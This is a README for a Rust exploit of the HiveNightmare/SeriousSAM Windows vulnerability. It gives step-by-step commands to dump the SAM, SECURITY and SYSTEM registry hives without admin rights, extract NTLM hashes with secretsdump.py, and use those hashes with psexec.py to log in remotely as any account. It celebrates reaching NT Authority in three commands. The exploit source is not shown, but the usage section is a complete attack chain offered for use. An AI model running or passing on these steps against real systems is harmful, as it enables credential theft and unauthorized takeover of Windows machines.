# Oxide Hive
An exploit for the HiveNightmare/SeriousSAM vulnerability that allows you to read registry hives containing sensitive data without admin privileges. If that doesn't sound like privilege escalation I don't know what does.

# Usage
After building the exploit with `cargo build` and retrieving the binary, deploy it in your testing environment, open CMD and do `.\oxide_hive [max shadow copies]`, the default for shadow copies is 15. The hives SAM, SECURITY and SYSTEM should be dumped to the working directory

From then on you can use [this script](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) with the command `secretsdump.py -sam SAM.dump -security SECURITY.dump -system SYSTEM.dump local` to retrieve the NTLM hashes.
Then you can use [another script](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) with the command `psexec.py -hashes <account's hash> <user>@<machine's ip> cmd.exe` to remotely log into any account. Congrats, you just went from unprivileged user to NT Authority with only 3 commands.

# Credits
- @jonasLyk, the person who discovered the vulnerability
- @GossiTheDog, the creator of [the original exploit](https://github.com/GossiTheDog/HiveNightmare) which I took inspiration from
- chron1k, coder of the exploit
